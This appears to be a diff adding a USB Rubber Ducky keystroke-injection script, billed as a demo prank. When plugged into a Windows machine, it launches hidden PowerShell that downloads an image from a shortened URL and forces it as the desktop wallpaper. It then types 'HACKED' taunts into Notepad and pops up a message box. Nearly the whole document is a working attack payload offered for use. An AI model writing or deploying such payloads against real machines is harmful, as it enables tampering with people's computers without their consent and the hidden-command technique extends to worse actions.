@@ -1,0 +1,59 @@
+REM *********************
+REM By th33gr00t
+REM props hack5 Daren link: https://www.youtube.com/watch?v=f3C58OKOsuo
+REM Ducky101, my first script
+REM *********************
+
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -W Hidden iwr -Uri https://cutt.ly/9wheMot -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';1..9|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}
+ENTER
+DELAY 1000
+DELAY 1000
+DELAY 1000
+GUI r
+DELAY 100
+STRING notepad
+ENTER
+GUI UPARROW
+DELAY 1000
+STRING !!HACKED!!
+ENTER
+STRING !!HACKED!!
+ENTER
+STRING !!HACKED!!
+ENTER
+STRING !!HACKED!!
+ENTER
+STRING !!HACKED!!
+ENTER
+STRING This is just a demo, now imagine this ...
+DELAY 500
+ENTER
+STRING A Hacker who is after you, how much damage can he do??
+ENTER
+DELAY 100
+STRING .....................................................
+ENTER
+DELAY 500
+STRING You wouldn't want to know nor imagine!!
+ENTER
+DELAY 100
+STRING .....................................................
+ENTER
+DELAY 500
+DELAY 1000
+DELAY 1000
+DELAY 1000
+DELAY 1000
+ALT F4
+RIGHT
+ENTER
+DELAY 1000
+DELAY 1000
+GUI r
+DELAY 500
+STRING PowerShell -W Hidden -NoProfile -NonInteractive -Command [reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.Windows.Forms.MessageBox]::show('1337: END OF DEMO TEAM')
+ENTER
+REM Done
